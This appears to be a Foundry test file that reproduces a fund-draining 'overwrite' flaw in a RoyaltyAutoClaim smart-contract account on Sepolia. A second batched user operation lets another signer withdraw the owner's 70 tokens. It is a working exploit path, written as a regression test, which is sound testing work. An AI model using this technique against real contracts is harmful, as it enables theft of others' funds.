// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "./BaseTest.t.sol";

// forge test test/RoyaltyAutoClaim/overwrite.t.sol --rpc-url $sepolia

contract RoyaltyAutoClaim_Overwrite_Test is BaseTest {
    function setUp() public override {
        super.setUp();
    }

    function test_overwrite_claimRoyalty() public {
        uint256 rac_pk = vm.envUint("RAC_PK");
        address rac = vm.addr(rac_pk);

        uint256 acc0_pk = vm.envUint("acc0pk");
        address acc0 = vm.addr(acc0_pk);

        address rac_sepolia = 0x66ECf28b049f8b917C58B6e81a999CDF309283eA;
        royaltyAutoClaim = RoyaltyAutoClaim(payable(rac_sepolia));

        address token_address = royaltyAutoClaim.token();
        IERC20 token = IERC20(token_address);

        uint256 beforeBalance = token.balanceOf(rac);
        uint256 beforeAcc0Balance = token.balanceOf(acc0);

        // rac still have to sign the userop
        PackedUserOperation memory userOp =
            _buildUserOpWithRandomNonce(rac_pk, rac_sepolia, abi.encodeCall(royaltyAutoClaim.claimRoyalty, ("hey")));

        PackedUserOperation memory userOp2 = _buildUserOpWithRandomNonce(
            acc0_pk, rac_sepolia, abi.encodeCall(royaltyAutoClaim.claimRoyalty, ("oh my dayum"))
        );

        PackedUserOperation[] memory ops = new PackedUserOperation[](2);
        ops[0] = userOp;
        ops[1] = userOp2;
        entryPoint.handleOps(ops, payable(msg.sender));

        uint256 afterBalance = token.balanceOf(rac);
        assertEq(afterBalance, beforeBalance);

        uint256 afterAcc0Balance = token.balanceOf(acc0);
        assertEq(afterAcc0Balance, beforeAcc0Balance + 70 ether); // Due to overwrite issue, acc0 was able to withdraw rac's funds
    }

    function _buildUserOpWithRandomNonce(uint256 privateKey, address sender, bytes memory callData)
        internal
        returns (PackedUserOperation memory)
    {
        PackedUserOperation memory userOp = _createUserOp();
        userOp.sender = sender;
        userOp.nonce = entryPoint.getNonce(sender, uint192(vm.randomUint())); // make nonce key random
        userOp.callData = callData;
        (uint8 v, bytes32 r, bytes32 s) =
            vm.sign(privateKey, ECDSA.toEthSignedMessageHash(entryPoint.getUserOpHash(userOp)));
        address signer = vm.addr(privateKey);
        userOp.signature = abi.encodePacked(r, s, v, signer);
        return userOp;
    }
}
